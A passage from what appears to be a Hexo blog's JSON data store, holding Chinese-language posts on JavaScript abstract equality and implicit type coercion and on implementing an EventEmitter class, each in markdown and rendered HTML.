''`，即判断 `'' == false`\n3. 第三部：`''` 使用 `ToNumber()` 方法，而 `Number('') === 0`\n4. 第四部：`false` 使用 `ToNumber()` 方法，而 `Number(false) === 0`\n5. 式子两边左右都为 0 , 所以 `[] == false` 成立","source":"_posts/JavaScript/隐式转换与抽象相等.md","raw":"---\ntitle: 隐式转换与抽象相等\ncategories: JavaScript\ntags: [JavaScript 原理]\ndate: 2021-04-27 17:24:48\n---\n\n# 隐式转换与抽象相等\n\n### 对象和非对象之间的相等比较\n\n关于对象（对象 / 函数 / 数组）和标量基本类型（字符串 / 数字 / 布尔值）之间的相等比较，ES5 规范 11.9.3.8-9 做如下规定：\n(1) 如果 `Type(x)` 是字符串或数字，`Type(y)` 是对象，则返回 `x == ToPrimitive(y)` 的结果；\n(2) 如果 `Type(x)` 是对象，`Type(y)` 是字符串或数字，则返回 `ToPromitive(x) == y` 的结果。\n\n### `==` 抽象相等隐式转换规则\n\n1. 如果两个值的类型相同，不用发生类型转换，就使用 `===` 来判断\n2. 在比较两个不同类型的值时会发生隐式强制类型转换\n3. 如果是对象与非对象之间的相等比较，则\n   1. 对象先调用 `valueOf()` 用来比较\n   2. `valueOf()` 返回值不是基本类型时，再调用 `toString()` 转换成基本数据类型\n4. 如果是**其他类型**和**布尔类型**之间的相等比较，则将**布尔类型**转换为**数字**\n5. 如果是**字符串**和**数字**之间的相等比较，则将**字符串**转换为**数字**\n\n\n### 其他类型与 boolean 类型之间的相等比较\n\n* 如果 `Type(x)` 是布尔类型，则返回 `ToNumber(x) == y` 的结果；\n* 如果 Type(y) 是布尔类型，则返回 `x == ToNumber(y)` 的结果。\n  \n### `number` 和 `string` 之间的相等比较\n\n* 如果 `Type(x)` 是数字，Type(y) 是字符串，则返回 `x == ToNumber(y)` 的结果。\n* 如果 `Type(x)` 是字符串，Type(y) 是数字，则返回 `ToNumber(x) == y `的结果。\n  \n### `null` 和 `undefined` 之间的相等比较\n\n说明：`null` 与 `undefined` 是抽象相等的，但与其他所有的值都不等\n* 如果 x 为 `null`，y 为 `undefined`，则结果为 `true`。\n* 如果 x 为 `undefined`，y 为 `null`，则结果为 `true`。\n\n```js\nnull == undefined // true\nnull == '' // false\nundefined == 0 // false\n```\n\n### `==` 抽象相等总结\n\n1. a、b 进行比较时，如果存在对象类型，则先调用 `valueOf()`，否则调用 `toString()` 转换成基本数据类型\n2. a、b 进行比较时，如果 a 与 b 是 `Number`, `String`, `Boolean` 这三种类型中的一种，则都转换成数字后再进行比较\n3. 如果存在 `null` 或 `undefined`  时，必须等式左右两边都为 `null` 或 `undefined，否则不肯能相等`\n\n```js\n42 == true // false\n42 == false // false\n'0' == false // true\n'' == false // true\n'' == 0 // true\n'' == [] // true\n0 == {}; // false -- Number(({}).toString()) 值为 NaN\n[] == ![] // true\n2 == [2]; // true\n'' == [null]; // true -- Number(([null]).toString()) 值为 0\n```\n\n### 为什么 `[] == false` 成立？\n\n1. 第一步：`[]` 先调用 `valueOf()` 方法， 相当于 `[].valueOf() == false`，而 `[].valueOf() === []`，即判断 `[] == false`\n2. 第二部：`[]` 再调用 `toString()` 方法，相当于 `[].toString() == false`，而 `[].toString() === ''`，即判断 `'' == false`\n3. 第三部：`''` 使用 `ToNumber()` 方法，而 `Number('') === 0`\n4. 第四部：`false` 使用 `ToNumber()` 方法，而 `Number(false) === 0`\n5. 式子两边左右都为 0 , 所以 `[] == false` 成立","slug":"JavaScript/隐式转换与抽象相等","published":1,"updated":"2021-04-29T10:48:12.022Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cko3yr62s000eio6rbx8h1bwl","content":"<h1 id=\"隐式转换与抽象相等\"><a href=\"#隐式转换与抽象相等\" class=\"headerlink\" title=\"隐式转换与抽象相等\"></a>隐式转换与抽象相等</h1><h3 id=\"对象和非对象之间的相等比较\"><a href=\"#对象和非对象之间的相等比较\" class=\"headerlink\" title=\"对象和非对象之间的相等比较\"></a>对象和非对象之间的相等比较</h3><p>关于对象（对象 / 函数 / 数组）和标量基本类型（字符串 / 数字 / 布尔值）之间的相等比较，ES5 规范 11.9.3.8-9 做如下规定：<br>(1) 如果 <code>Type(x)</code> 是字符串或数字，<code>Type(y)</code> 是对象，则返回 <code>x == ToPrimitive(y)</code> 的结果；<br>(2) 如果 <code>Type(x)</code> 是对象，<code>Type(y)</code> 是字符串或数字，则返回 <code>ToPromitive(x) == y</code> 的结果。</p>\n<h3 id=\"抽象相等隐式转换规则\"><a href=\"#抽象相等隐式转换规则\" class=\"headerlink\" title=\"== 抽象相等隐式转换规则\"></a><code>==</code> 抽象相等隐式转换规则</h3><ol>\n<li>如果两个值的类型相同，不用发生类型转换，就使用 <code>===</code> 来判断</li>\n<li>在比较两个不同类型的值时会发生隐式强制类型转换</li>\n<li>如果是对象与非对象之间的相等比较，则<ol>\n<li>对象先调用 <code>valueOf()</code> 用来比较</li>\n<li><code>valueOf()</code> 返回值不是基本类型时，再调用 <code>toString()</code> 转换成基本数据类型</li>\n</ol>\n</li>\n<li>如果是<strong>其他类型</strong>和<strong>布尔类型</strong>之间的相等比较，则将<strong>布尔类型</strong>转换为<strong>数字</strong></li>\n<li>如果是<strong>字符串</strong>和<strong>数字</strong>之间的相等比较，则将<strong>字符串</strong>转换为<strong>数字</strong></li>\n</ol>\n<h3 id=\"其他类型与-boolean-类型之间的相等比较\"><a href=\"#其他类型与-boolean-类型之间的相等比较\" class=\"headerlink\" title=\"其他类型与 boolean 类型之间的相等比较\"></a>其他类型与 boolean 类型之间的相等比较</h3><ul>\n<li>如果 <code>Type(x)</code> 是布尔类型，则返回 <code>ToNumber(x) == y</code> 的结果；</li>\n<li>如果 Type(y) 是布尔类型，则返回 <code>x == ToNumber(y)</code> 的结果。</li>\n</ul>\n<h3 id=\"number-和-string-之间的相等比较\"><a href=\"#number-和-string-之间的相等比较\" class=\"headerlink\" title=\"number 和 string 之间的相等比较\"></a><code>number</code> 和 <code>string</code> 之间的相等比较</h3><ul>\n<li>如果 <code>Type(x)</code> 是数字，Type(y) 是字符串，则返回 <code>x == ToNumber(y)</code> 的结果。</li>\n<li>如果 <code>Type(x)</code> 是字符串，Type(y) 是数字，则返回 <code>ToNumber(x) == y </code>的结果。</li>\n</ul>\n<h3 id=\"null-和-undefined-之间的相等比较\"><a href=\"#null-和-undefined-之间的相等比较\" class=\"headerlink\" title=\"null 和 undefined 之间的相等比较\"></a><code>null</code> 和 <code>undefined</code> 之间的相等比较</h3><p>说明：<code>null</code> 与 <code>undefined</code> 是抽象相等的，但与其他所有的值都不等</p>\n<ul>\n<li>如果 x 为 <code>null</code>，y 为 <code>undefined</code>，则结果为 <code>true</code>。</li>\n<li>如果 x 为 <code>undefined</code>，y 为 <code>null</code>，则结果为 <code>true</code>。</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"literal\">null</span> == <span class=\"literal\">undefined</span> <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"literal\">null</span> == <span class=\"string\">&#x27;&#x27;</span> <span class=\"comment\">// false</span></span><br><span class=\"line\"><span class=\"literal\">undefined</span> == <span class=\"number\">0</span> <span class=\"comment\">// false</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"抽象相等总结\"><a href=\"#抽象相等总结\" class=\"headerlink\" title=\"== 抽象相等总结\"></a><code>==</code> 抽象相等总结</h3><ol>\n<li>a、b 进行比较时，如果存在对象类型，则先调用 <code>valueOf()</code>，否则调用 <code>toString()</code> 转换成基本数据类型</li>\n<li>a、b 进行比较时，如果 a 与 b 是 <code>Number</code>, <code>String</code>, <code>Boolean</code> 这三种类型中的一种，则都转换成数字后再进行比较</li>\n<li>如果存在 <code>null</code> 或 <code>undefined</code>  时，必须等式左右两边都为 <code>null</code> 或 <code>undefined，否则不肯能相等</code></li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">42</span> == <span class=\"literal\">true</span> <span class=\"comment\">// false</span></span><br><span class=\"line\"><span class=\"number\">42</span> == <span class=\"literal\">false</span> <span class=\"comment\">// false</span></span><br><span class=\"line\"><span class=\"string\">&#x27;0&#x27;</span> == <span class=\"literal\">false</span> <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;</span> == <span class=\"literal\">false</span> <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;</span> == <span class=\"number\">0</span> <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;</span> == [] <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"number\">0</span> == &#123;&#125;; <span class=\"comment\">// false -- Number((&#123;&#125;).toString()) 值为 NaN</span></span><br><span class=\"line\">[] == ![] <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"number\">2</span> == [<span class=\"number\">2</span>]; <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;</span> == [<span class=\"literal\">null</span>]; <span class=\"comment\">// true -- Number(([null]).toString()) 值为 0</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"为什么-false-成立？\"><a href=\"#为什么-false-成立？\" class=\"headerlink\" title=\"为什么 [] == false 成立？\"></a>为什么 <code>[] == false</code> 成立？</h3><ol>\n<li>第一步：<code>[]</code> 先调用 <code>valueOf()</code> 方法， 相当于 <code>[].valueOf() == false</code>，而 <code>[].valueOf() === []</code>，即判断 <code>[] == false</code></li>\n<li>第二部：<code>[]</code> 再调用 <code>toString()</code> 方法，相当于 <code>[].toString() == false</code>，而 <code>[].toString() === &#39;&#39;</code>，即判断 <code>&#39;&#39; == false</code></li>\n<li>第三部：<code>&#39;&#39;</code> 使用 <code>ToNumber()</code> 方法，而 <code>Number(&#39;&#39;) === 0</code></li>\n<li>第四部：<code>false</code> 使用 <code>ToNumber()</code> 方法，而 <code>Number(false) === 0</code></li>\n<li>式子两边左右都为 0 , 所以 <code>[] == false</code> 成立</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"隐式转换与抽象相等\"><a href=\"#隐式转换与抽象相等\" class=\"headerlink\" title=\"隐式转换与抽象相等\"></a>隐式转换与抽象相等</h1><h3 id=\"对象和非对象之间的相等比较\"><a href=\"#对象和非对象之间的相等比较\" class=\"headerlink\" title=\"对象和非对象之间的相等比较\"></a>对象和非对象之间的相等比较</h3><p>关于对象（对象 / 函数 / 数组）和标量基本类型（字符串 / 数字 / 布尔值）之间的相等比较，ES5 规范 11.9.3.8-9 做如下规定：<br>(1) 如果 <code>Type(x)</code> 是字符串或数字，<code>Type(y)</code> 是对象，则返回 <code>x == ToPrimitive(y)</code> 的结果；<br>(2) 如果 <code>Type(x)</code> 是对象，<code>Type(y)</code> 是字符串或数字，则返回 <code>ToPromitive(x) == y</code> 的结果。</p>\n<h3 id=\"抽象相等隐式转换规则\"><a href=\"#抽象相等隐式转换规则\" class=\"headerlink\" title=\"== 抽象相等隐式转换规则\"></a><code>==</code> 抽象相等隐式转换规则</h3><ol>\n<li>如果两个值的类型相同，不用发生类型转换，就使用 <code>===</code> 来判断</li>\n<li>在比较两个不同类型的值时会发生隐式强制类型转换</li>\n<li>如果是对象与非对象之间的相等比较，则<ol>\n<li>对象先调用 <code>valueOf()</code> 用来比较</li>\n<li><code>valueOf()</code> 返回值不是基本类型时，再调用 <code>toString()</code> 转换成基本数据类型</li>\n</ol>\n</li>\n<li>如果是<strong>其他类型</strong>和<strong>布尔类型</strong>之间的相等比较，则将<strong>布尔类型</strong>转换为<strong>数字</strong></li>\n<li>如果是<strong>字符串</strong>和<strong>数字</strong>之间的相等比较，则将<strong>字符串</strong>转换为<strong>数字</strong></li>\n</ol>\n<h3 id=\"其他类型与-boolean-类型之间的相等比较\"><a href=\"#其他类型与-boolean-类型之间的相等比较\" class=\"headerlink\" title=\"其他类型与 boolean 类型之间的相等比较\"></a>其他类型与 boolean 类型之间的相等比较</h3><ul>\n<li>如果 <code>Type(x)</code> 是布尔类型，则返回 <code>ToNumber(x) == y</code> 的结果；</li>\n<li>如果 Type(y) 是布尔类型，则返回 <code>x == ToNumber(y)</code> 的结果。</li>\n</ul>\n<h3 id=\"number-和-string-之间的相等比较\"><a href=\"#number-和-string-之间的相等比较\" class=\"headerlink\" title=\"number 和 string 之间的相等比较\"></a><code>number</code> 和 <code>string</code> 之间的相等比较</h3><ul>\n<li>如果 <code>Type(x)</code> 是数字，Type(y) 是字符串，则返回 <code>x == ToNumber(y)</code> 的结果。</li>\n<li>如果 <code>Type(x)</code> 是字符串，Type(y) 是数字，则返回 <code>ToNumber(x) == y </code>的结果。</li>\n</ul>\n<h3 id=\"null-和-undefined-之间的相等比较\"><a href=\"#null-和-undefined-之间的相等比较\" class=\"headerlink\" title=\"null 和 undefined 之间的相等比较\"></a><code>null</code> 和 <code>undefined</code> 之间的相等比较</h3><p>说明：<code>null</code> 与 <code>undefined</code> 是抽象相等的，但与其他所有的值都不等</p>\n<ul>\n<li>如果 x 为 <code>null</code>，y 为 <code>undefined</code>，则结果为 <code>true</code>。</li>\n<li>如果 x 为 <code>undefined</code>，y 为 <code>null</code>，则结果为 <code>true</code>。</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"literal\">null</span> == <span class=\"literal\">undefined</span> <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"literal\">null</span> == <span class=\"string\">&#x27;&#x27;</span> <span class=\"comment\">// false</span></span><br><span class=\"line\"><span class=\"literal\">undefined</span> == <span class=\"number\">0</span> <span class=\"comment\">// false</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"抽象相等总结\"><a href=\"#抽象相等总结\" class=\"headerlink\" title=\"== 抽象相等总结\"></a><code>==</code> 抽象相等总结</h3><ol>\n<li>a、b 进行比较时，如果存在对象类型，则先调用 <code>valueOf()</code>，否则调用 <code>toString()</code> 转换成基本数据类型</li>\n<li>a、b 进行比较时，如果 a 与 b 是 <code>Number</code>, <code>String</code>, <code>Boolean</code> 这三种类型中的一种，则都转换成数字后再进行比较</li>\n<li>如果存在 <code>null</code> 或 <code>undefined</code>  时，必须等式左右两边都为 <code>null</code> 或 <code>undefined，否则不肯能相等</code></li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">42</span> == <span class=\"literal\">true</span> <span class=\"comment\">// false</span></span><br><span class=\"line\"><span class=\"number\">42</span> == <span class=\"literal\">false</span> <span class=\"comment\">// false</span></span><br><span class=\"line\"><span class=\"string\">&#x27;0&#x27;</span> == <span class=\"literal\">false</span> <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;</span> == <span class=\"literal\">false</span> <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;</span> == <span class=\"number\">0</span> <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;</span> == [] <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"number\">0</span> == &#123;&#125;; <span class=\"comment\">// false -- Number((&#123;&#125;).toString()) 值为 NaN</span></span><br><span class=\"line\">[] == ![] <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"number\">2</span> == [<span class=\"number\">2</span>]; <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;</span> == [<span class=\"literal\">null</span>]; <span class=\"comment\">// true -- Number(([null]).toString()) 值为 0</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"为什么-false-成立？\"><a href=\"#为什么-false-成立？\" class=\"headerlink\" title=\"为什么 [] == false 成立？\"></a>为什么 <code>[] == false</code> 成立？</h3><ol>\n<li>第一步：<code>[]</code> 先调用 <code>valueOf()</code> 方法， 相当于 <code>[].valueOf() == false</code>，而 <code>[].valueOf() === []</code>，即判断 <code>[] == false</code></li>\n<li>第二部：<code>[]</code> 再调用 <code>toString()</code> 方法，相当于 <code>[].toString() == false</code>，而 <code>[].toString() === &#39;&#39;</code>，即判断 <code>&#39;&#39; == false</code></li>\n<li>第三部：<code>&#39;&#39;</code> 使用 <code>ToNumber()</code> 方法，而 <code>Number(&#39;&#39;) === 0</code></li>\n<li>第四部：<code>false</code> 使用 <code>ToNumber()</code> 方法，而 <code>Number(false) === 0</code></li>\n<li>式子两边左右都为 0 , 所以 <code>[] == false</code> 成立</li>\n</ol>\n"},{"title":"EventEmitter 实现原理","date":"2021-03-12T07:32:28.000Z","_content":"\n# EventEmitter 实现原理\n\n```js\nclass EventEmitter {\n  constructor() {\n    this.events = Object.create(null)\n  }\n\n  // 监听事件\n  on(eventName, fn) {\n    if (!this.events[eventName]) {\n      this.events[eventName] = []\n    }\n\n    this.events[eventName].push(fn)\n  }\n\n  // 触发事件\n  emit(eventName, ...args) {\n    if (!this.events[eventName] || !Array.isArray(this.events[eventName])) return\n\n    this.events[eventName].map(fn => {\n      fn.apply(this, args)\n    })\n  }\n\n  // 注销事件\n  off(eventName, fn) {\n    if (fn === void 0) {\n      this.events[eventName] = null\n      return\n    }\n\n    if (this.events[eventName].length) {\n      const index = this.events[eventName].findIndex(item => item === fn)\n\n      if (index > -1) {\n        this.events[eventName].splice(index, 1)\n      }\n    }\n  }\n\n  // 注册单次执行的事件\n  once(eventName, fn) {\n    const only = (...args) => {\n      fn.apply(this, args)\n      this.off(eventName)\n    }\n\n    this.on(eventName, only)\n  }\n}\n\n\n// test on/emit function\nconst eventBus = new EventEmitter()\neventBus.on('click', () => console.log(1))\neventBus.emit('click')\n// --- output ---\n// 1\n\n// test on/emit function\nconst cb = function (...args) {\n  console.log('2: ', args)\n}\neventBus.on('input', () => console.log(1))\neventBus.on('input', cb)\neventBus.emit('input', {name: 'jack'}, {age: 18})\n// --- output ---\n// 1 ​​​​​\n// 2:  [ { name: 'jack' }, { age: 18 } ] \n\n// test on/off/emit function\neventBus.off('input', cb)\neventBus.emit('input', {name: 'jack'}, {age: 18})\n// --- output ---\n// 1 ​​​​​\n\n// test on/off/emit function\neventBus.off('input')\neventBus.emit('input', {name: 'jack'}, {age: 18})\n// --- output ---\n\n// test once/emit function\neventBus.once('change', cb)\neventBus.emit('change', {name: 'jack'})\neventBus.emit('change', {name: 'jack'})\n// --- output ---\n// [ { name: 'jack' } ] \n```","source":"_posts/JavaScript 编程题/EventEmitter 实现原理.md","raw":"---\ntitle: EventEmitter 实现原理\ncategories: JavaScript 编程题\ntags: [编程题]\ndate: 2021-03-12 15:32:28\n---\n\n# EventEmitter 实现原理\n\n```js\nclass EventEmitter {\n  constructor() {\n    this.events = Object.create(null)\n  }\n\n  // 监听事件\n  on(eventName, fn) {\n    if (!this.events[eventName]) {\n      this.events[eventName] = []\n    }\n\n    this.events[eventName].push(fn)\n  }\n\n  // 触发事件\n  emit(eventName, ...args) {\n    if (!this.events[eventName] || !Array.isArray(this.events[eventName])) return\n\n    this.events[eventName].map(fn => {\n      fn.apply(this, args)\n    })\n  }\n\n  // 注销事件\n  off(eventName, fn) {\n    if (fn === void 0) {\n      this.events[eventName] = null\n      return\n    }\n\n    if (this.events[eventName].length) {\n      const index = this.events[eventName].findIndex(item => item === fn)\n\n      if (index > -1) {\n        this.events[eventName].splice(index, 1)\n      }\n    }\n  }\n\n  // 注册单次执行的事件\n  once(eventName, fn) {\n    const only = (...args) => {\n      fn.apply(this, args)\n      this.off(eventName)\n    }\n\n    this.on(eventName, only)\n  }\n}\n\n\n// test on/emit function\nconst eventBus = new EventEmitter()\neventBus.on('click', () => console.log(1))\neventBus.emit('click')\n// --- output ---\n// 1\n\n// test on/emit function\nconst cb = function (...args) {\n  console.log('2: ', args)\n}\neventBus.on('input', () => console.log(1))\neventBus.on('input', cb)\neventBus.emit('input', {name: 'jack'}, {age: 18})\n// --- output ---\n// 1 ​​​​​\n// 2:  [ { name: 'jack' }, { age: 18 } ] \n\n// test on/off/emit function\neventBus.off('input', cb)\neventBus.emit('input', {name: 'jack'}, {age: 18})\n// --- output ---\n// 1 ​​​​​\n\n// test on/off/emit function\neventBus.off('input')\neventBus.emit('input', {name: 'jack'}, {age: 18})\n// --- output ---\n\n// test once/emit function\neventBus.once('change', cb)\neventBus.emit('change', {name: 'jack'})\neventBus.emit('change', {name: 'jack'})\n// --- output ---\n// [ { name: 'jack' } ] \n```","slug":"JavaScript 编程题/EventEmitter 实现原理","published":1,"updated":"2021-04-30T06:59:16.820Z","_id":"cko3yr62t000hio6rfm1ibuns","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"EventEmitter-实现原理\"><a href=\"#EventEmitter-实现原理\" class=\"headerlink\" title=\"EventEmitter 实现原理\"></a>EventEmitter 实现原理</h1><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">EventEmitter</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">constructor</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.events = <span class=\"built_in\">Object</span>.create(<span class=\"literal\">null</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 监听事件</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">on</span>(<span class=\"params\">eventName, fn</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"built_in\">this</span>.events[eventName]) &#123;</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.events[eventName] = []</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">this</span>.events[eventName].push(fn)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 触发事件</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">emit</span>(<span class=\"params\">eventName, ...args</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"built_in\">this</span>.events[eventName] || !<span class=\"built_in\">Array</span>.isArray(<span class=\"built_in\">this</span>.events[eventName])) <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">this</span>.events[eventName].map(<span class=\"function\"><span class=\"params\">fn</span> =&gt;</span> &#123;</span><br><span class=\"line\">      fn.apply(<span class=\"built_in\">this</span>, args)</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 注销事件</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">off</span>(<span class=\"params\">eventName, fn</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (fn === <span class=\"keyword\">void</span> <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.events[eventName] = <span class=\"literal\">null</span></span><br><span class=\"line\">      <span class=\"keyword\">return</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">this</span>.events[eventName].length) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">const</span> index = <span class=\"built_in\">this</span>.events[eventName].findIndex(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> item === fn)</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (index &gt; -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.events[eventName].splice(index, <span class=\"number\">1</span>)</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 注册单次执行的事件</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">once</span>(<span class=\"params\">eventName, fn</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> only = <span class=\"function\">(<span class=\"params\">...args</span>) =&gt;</span> &#123;</span><br><span class=\"line\">      fn.apply(<span class=\"built_in\">this</span>, args)</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.off(eventName)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">this</span>.on(eventName, only)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// test on/emit function</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> eventBus = <span class=\"keyword\">new</span> EventEmitter()</span><br><span class=\"line\">eventBus.on(<span class=\"string\">&#x27;click&#x27;</span>, <span class=\"function\">() =&gt;</span> <span class=\"built_in\">console</span>.log(<span class=\"number\">1</span>))</span><br><span class=\"line\">eventBus.emit(<span class=\"string\">&#x27;click&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">// --- output ---</span></span><br><span class=\"line\"><span class=\"comment\">// 1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// test on/emit function</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> cb = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">...args</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;2: &#x27;</span>, args)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">eventBus.on(<span class=\"string\">&#x27;input&#x27;</span>, <span class=\"function\">() =&gt;</span> <span class=\"built_in\">console</span>.log(<span class=\"number\">1</span>))</span><br><span class=\"line\">eventBus.on(<span class=\"string\">&#x27;input&#x27;</span>, cb)</span><br><span class=\"line\">eventBus.emit(<span class=\"string\">&#x27;input&#x27;</span>, &#123;<span class=\"attr\">name</span>: <span class=\"string\">&#x27;jack&#x27;</span>&#125;, &#123;<span class=\"attr\">age</span>: <span class=\"number\">18</span>&#125;)</span><br><span class=\"line\"><span class=\"comment\">// --- output ---</span></span><br><span class=\"line\"><span class=\"comment\">// 1 ​​​​​</span></span><br><span class=\"line\"><span class=\"comment\">// 2:  [ &#123; name: &#x27;jack&#x27; &#125;, &#123; age: 18 &#125; ] </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// test on/off/emit function</span></span><br><span class=\"line\">eventBus.off(<span 